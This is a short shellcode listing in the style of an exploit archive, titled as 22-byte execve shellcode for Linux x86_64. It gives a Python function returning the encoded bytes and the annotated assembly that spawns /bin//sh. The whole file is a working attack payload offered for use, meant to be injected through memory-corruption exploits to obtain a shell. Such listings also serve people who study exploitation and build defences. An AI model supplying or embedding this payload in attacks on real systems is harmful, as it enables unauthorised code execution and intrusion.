#;Title: execve shellcode 22 bytes
#;Author: d4sh&r
#;Contact: https://mx.linkedin.com/in/d4v1dvc
#;Category: Shellcode
#;Architecture:linux x86_64


#WORKED
#Linux whoami 3.19.0-37-generic #42~14.04.1-Ubuntu SMP Mon Nov 23 15:13:51 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
def bin_shx64():
	return r"\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
"""
global _start

_start:
    mul esi
    push rdx
    mov rbx, 0x68732f2f6e69622f ;/bin//sh
    push rbx
    lea rdi, [rsp] ;address of /bin//sh
    mov al, 59 ;execve
    syscall
"""